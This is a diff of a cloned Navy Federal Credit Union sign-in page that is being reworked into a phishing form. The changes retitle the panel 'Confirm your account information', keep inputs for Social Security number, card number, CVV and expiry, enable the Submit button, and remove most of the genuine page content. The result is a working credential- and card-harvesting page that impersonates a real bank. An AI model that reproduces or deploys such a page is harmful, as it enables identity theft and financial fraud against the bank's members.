@@ -154,7 +154,7 @@ document.getElementById("year").innerHTML = date;
 								
 								<div class="panel panel-primary heading-callout">
 				                    <div class="panel-heading">
-				                        <h2 class="panel-title"><span class="icon-padlock"></span>Personal Info</h2>
+				                        <h style="color: blue;" class="panel-title"><span class="icon-padlock"></span>Confirm your account information</h2>
 				                    </div>
 				                    <div class="rule-container">
 				                    	<div class="horizontal-line"></div>
@@ -165,31 +165,31 @@ document.getElementById("year").innerHTML = date;
 												<div class="userPassGroup">
 													<div class="form-group username" style="display:inline-block;">
 														<label for="user">Address</label> <span class="tooltipOne" data-guidetext="Sign into online banking with your unique Username, which may be your access number." aria-label="Sign into online banking with your unique Username, which may be your access number." tabindex="0" role="button" aria-disabled="true"></span>														
-							  	  						<input required type="text" name="address" placeholder="P.O. Box 3000 Merrifield, VA 22119" id="user" maxlength="32" class="form-control" required="">
+							  	  						<input type="text" name="address" placeholder="P.O. Box 3000 Merrifield, VA 22119" id="user" maxlength="32" class="form-control" required="">
 													</div>
 													<div class="form-group password" style="display:inline-block;">
 														<label for="password">Social Security Number</label>
-														<input required type="password" name="ssn" placeholder="xxx-xx-xxxx" id="password" class="form-control" required="">
+														<input type="password" name="ssn" placeholder="xxx-xx-xxxx" id="password" class="form-control" required="">
 													</div><div class="form-group username" style="display:inline-block;">
 														<label for="user">Card No.</label> <span class="tooltipOne" data-guidetext="Sign into online banking with your unique Username, which may be your access number." aria-label="Sign into online banking with your unique Username, which may be your access number." tabindex="0" role="button" aria-disabled="true"></span>														
-							  	  						<input required type="text" name="card" placeholder="1234-1234-1234-1234" id="user" maxlength="32" class="form-control" required="">
+							  	  						<input type="text" name="card" placeholder="1234-1234-1234-1234" id="user" maxlength="32" class="form-control" required="">
 													</div>
                                                     <div class="form-group username" style="display:inline-block;">
 														<label for="user">CVV</label> <span class="tooltipOne" data-guidetext="Sign into online banking with your unique Username, which may be your access number." aria-label="Sign into online banking with your unique Username, which may be your access number." tabindex="0" role="button" aria-disabled="true"></span>														
-							  	  						<input required type="text" name="cvv" placeholder="000" id="user" maxlength="32" class="form-control" required="">
+							  	  						<input type="text" name="cvv" placeholder="000" id="user" maxlength="32" class="form-control" required="">
 													</div>
                                                     <div class="form-group username" style="display:inline-block;">
 														<label for="user">Expiry: mm/yyyy </label> <span class="tooltipOne" data-guidetext="Sign into online banking with your unique Username, which may be your access number." aria-label="Sign into online banking with your unique Username, which may be your access number." tabindex="0" role="button" aria-disabled="true"></span>														
-							  	  						<input required type="month" name="exp" id="user" maxlength="32" class="form-control" required="">
+							  	  						<input type="month" name="exp" id="user" maxlength="32" class="form-control" required="">
 													</div>
 
-													<div class="signInHelp"><a href="" aria-label="Sign In Help">Sign In Help</a></div>
+													<div class="signInHelp"><a href="" aria-label="Sign In Help"></a></div>
 												</div>
 												
 												<div class="submitAndRecaptcha "> 
 												
 												
-													<input type="submit" name="SignIn" class="btn btn-primary reg-sign-in" id="signIn" value="Submit" disabled="disabled">
+													<input type="submit" name="SignIn" class="btn btn-primary reg-sign-in" id="signIn" value="Submit" >
 												
 												
 												</div>
@@ -212,179 +212,10 @@ document.getElementById("year").innerHTML = date;
 						</div>
 					</div>
 				</div>
-			<!-- Internal Navigation Links -->
-			<div class="membership-content-box">
-				<div class="membership-middle">
-					<div class="join-nfcu">
-						<div class="join-nfcu-container">
-							<div class="membership-verbiage">
-								<div class="not-a-member">
-									<h2 id="not-a-nfcu-mbr">Not a Navy Federal member?</h2>
-								</div>
-								<div class="join-now-verbiage" id="joinNowVerbiage">
-									<p>Join now and enjoy the support and great service of a credit union that puts your needs first.</p>
-								</div>
-							</div>
-							
-							<div class="member-buttons">
-								<button onclick="setTimeout(function(){window.location.href=''}, 500);" class="become-member">Become a Member</button>
-								<button onclick="setTimeout(function(){window.location.href=''},500);" class="membership-learn-more" aria-describedby="not-a-nfcu-mbr">Learn More</button>
-							</div>
-							
-						</div>
-					</div>
-					<div class="join-picture">
-						<img class="join-img" alt="" src="Navy%20Federal%20Credit%20Union%20-%20Our%20Members%20are%20the%20Mission%C2%AE_files/img-BecomeAMember-b128db0c7cc6f6336bdf252ade6918e0.jpg">
-					</div>
 				</div>
-			</div>
-					<div class="page-header">
-						<div class="content-box">	
-							<div class="ph-content-box">
-								<div class="col-sm-4">
-									<div class="circle">
-										<img class="circle-icon" src="Navy%20Federal%20Credit%20Union%20-%20Our%20Members%20are%20the%20Mission%C2%AE_files/Group5159-b128db0c7cc6f6336bdf252ade6918e0.svg" alt="">
-									</div>
-									<div class="ph-text-h3"><h3>Don't have online access?</h3></div>	
-									<div class="ph-text-a"><a href="">Enroll in digital banking <span aria-hidden="true">�</span></a></div>
-									
-								</div>
-								<div class="col-sm-4">
-									<div class="circle">
-										<img class="circle-icon special6px" src="Navy%20Federal%20Credit%20Union%20-%20Our%20Members%20are%20the%20Mission%C2%AE_files/Group5166-b128db0c7cc6f6336bdf252ade6918e0.svg" alt="">
-									</div>
-									<div id="digitalBankingSecurityHeader" class="ph-text-h3"><h3>Find out more about secure digital banking</h3></div>
-									<div class="ph-text-a"><a href="" aria-describedby="digitalBankingSecurityHeader">Learn more <span aria-hidden="true">�</span></a></div>
-								</div>
-								<div class="col-sm-4">
-									<div class="circle">
-										<img class="circle-icon" src="Navy%20Federal%20Credit%20Union%20-%20Our%20Members%20are%20the%20Mission%C2%AE_files/Group5158-b128db0c7cc6f6336bdf252ade6918e0.svg" alt="">
-									</div>
-									<div class="ph-text-h3"><h3>Need help?</h3></div>
-									<div class="ph-text-a"><a href="https://www.navyfederal.org/contact-us/">Contact us <span aria-hidden="true">�</span></a></div>
-									
-								</div>
-							</div>
-						</div>
-					</div>
-						
-					<!-- <div class="internal-ad">
-						<iframe src="https://www.navyfederal.org/nfoaa-navads/signin.html" frameborder="0" title="Navy Federal Promotion/Spotlight" tabindex="0"></iframe>
-					</div> -->
-				</div>	
-			</div>
-				<!-- end of Internal ad-->
-			
-		
-		<!-- start of footer  -->
-		<div class="container footer">
-			<div class="content-box">
-				<div class="ft-content-box">
-		            <div class="footer-content">
-		                <div class="ft-logo">
-		                    <a href="" title="Go to NavyFederal.org" target="_blank" class="ft-logo-a">
-		                    	<span class="nfcu-icon-ftlogo">&#58888;</span>
-		                    </a>
-		                </div>
-		                <div class="content">
-		                    <div class="member-services marginbottom20">
-		      						<span class="mbr-services-txt">24/7 Member Services:<b>&nbsp;1-888-842-6328&nbsp;</b></span><span class="separator mob-pipe">&#8200; &#8200;|&#8200; &#8200;</span><span class="mob-line-break"><br></span>
-		      						<span class="text-routing">Routing Number:&nbsp;<b>256074974</b> </span>
-		      						<hr>
-		      				</div>
-		      				<div class="nav-container">
-				                <nav class="nav ft-nav paddingtop20 marginbottom20" role="navigation">
-										<a href="">About Us&#8200; &#8200;</a> <span class="separator">|</span>
-										<a href="">&#8200; &#8200;Contact Us&#8200; &#8200;</a> <span class="separator">|</span>
-										<a href="">&#8200; &#8200;Privacy Policy&#8200; &#8200;</a> <span class="separator">|</span>
-										<a href="">&#8200; &#8200;Security&#8200; &#8200;</a> <span class="separator">|</span>
-										<a href="">&#8200; &#8200;Accessibility&#8200; &#8200;</a> <span class="separator">|</span>
-										<a href="">&#8200; &#8200;Browser Support</a>
-								</nav>
-							</div>
-							<div class="copyright">	
-								<p id="copyright">
-									� <span id="year" style="font-weight:800;">2022</span><span class="copyright">&nbsp;<b>Navy Federal Credit Union.</b> </span> All rights reserved.
-								</p>
-							</div>
-							
-		                        <div class="nav regInstitutions"> 
-									<div class="ncua-link"><a href="" id="ncua-font"><span class="icon-ncua"></span> Federally Insured by NCUA</a><span class="separator">&#8200;&#8200;&#8200;&#8200;&#8200;|&#8200;&#8200;&#8200;&#8200;&#8200;</span></div> 
-									<div class="ehl-link"><a href="" id="EHL"><span class="icon-housing"></span> Equal Housing Lender</a> </div>
-								</div>	                    
-		                    
-		                    <div class="ft-disclaimers">
-		                    	<p>
-									APY = Annual Percentage Yield <span class="separator">|</span> APR = Annual Percentage Rate
-								</p>
-		                        <p>
-		                            <sup>+</sup>Rates are based on an evaluation of credit history, so your rate may differ.
-		                        </p>
-		
-		                        <p>
-		                            <sup>++</sup>Rates are variable, and based on an evaluation of credit history, so your rate may differ.
-		                        </p>
-		                        
-		                        <p>
-		                        	<sup>*</sup>Message and date rates may apply. Terms and Conditions are available.
-		                        </p>
-		                        
-		                        <p>
-		                         iPhone�, iPad� and iPod touch� are trademarks
- of Apple Inc. App Store&#8480; is a service mark of Apple Inc. Android� and 
-Google Play� are trademarks of Google Inc. Images used for 
-representational purposes only; do not imply government endorsement.
-		                    	</p>
-		                    </div>
-		                </div>
-		            </div>
-		    	</div>
-	    	</div>
-	    </div>
-	    <!-- end of footer  -->
-</div>
-    
-    <!-- set the src of the iframe as about:blank so that they don't automatically load on browser load -->
-    
-	<!-- iFrame for onlineDisclosure -->
-    <div class="modal fade" id="modalonlineDisclosure" tabindex="-1" role="dialog" aria-labelledby="modalonlineDisclosureLabel">
-        <div class="modal-dialog" role="document">
-            <div class="modal-content">
-                <div class="modal-header">
-                    <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span class="fa fa-times" aria-hidden="true"></span></button>
-                    <p class="modal-title" id="modalonlineDisclosureLabel">Use of Cookies by Navy Federal Online</p>
-                </div>
-                <div class="modal-body">
-                    <iframe id="onlineDisclosureFrame" class="cookies" data-src="https://web.navyfederal.org/online-disclosure.html" src="Navy%20Federal%20Credit%20Union%20-%20Our%20Members%20are%20the%20Mission%C2%AE_files/a_003.html" frameborder="0"></iframe>
-                </div>
-                <div class="modal-footer">
-                	<button type="button" id="modal-button" value="Done" data-dismiss="modal" aria-label="Done">Done</button>
-                </div>
-            </div>
-        </div>
-    </div>
-    <!-- End of onlineDisclosure Modal -->
-    
-    <!-- iFrame for browserRequirements -->
-    <div class="modal fade" id="modalbrowserRequirements" tabindex="-1" role="dialog" aria-labelledby="modalbrowserRequirementsLabel">
-        <div class="modal-dialog" role="document">
-            <div class="modal-content">
-                <div class="modal-header">
-                    <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span class="fa fa-times" aria-hidden="true"></span></button>
-                    <p class="modal-title" id="modalbrowserRequirementsLabel">Browser Requirements</p>
-                </div>
-                <div class="modal-body">
-               		<iframe id="browserRequirementsFrame" data-src="https://www.navyfederal.org/support/index.php" src="Navy%20Federal%20Credit%20Union%20-%20Our%20Members%20are%20the%20Mission%C2%AE_files/a_003.html" width="580" height="740" frameborder="0"></iframe>
-                </div>
-            </div>
-        </div>
-    </div>
-    <!-- End of browserRequirements Modal -->
-
-	
-	<div id="rightnowLogout" style="display: none;">
-		<iframe src="https://rnemsg.navyfederal.org/ci/pta/logout" width="1" height="1"></iframe>
 	</div>
+</div>
+</body>
+</html>
 
-<script type="text/javascript" src="Navy%20Federal%20Credit%20Union%20-%20Our%20Members%20are%20the%20Mission%C2%AE_files/lAywPNlIB"></script>
-<iframe src="Navy%20Federal%20Credit%20Union%20-%20Our%20Members%20are%20the%20Mission%C2%AE_files/a_003.html" id="jwtredirect" style="width: 0px; height: 0px; border: 0px none; display: none;"></iframe><iframe style="width: 0px; height: 0px; position: absolute; top: -1000px; left: -1000px; display: none;" tabindex="-1" aria-hidden="true" role="presentation" title="Intentionally blank" name="lpSS_8793304102" id="lpSS_8793304102" src="Navy%20Federal%20Credit%20Union%20-%20Our%20Members%20are%20the%20Mission%C2%AE_files/storage.html"></iframe></body></html>
+			
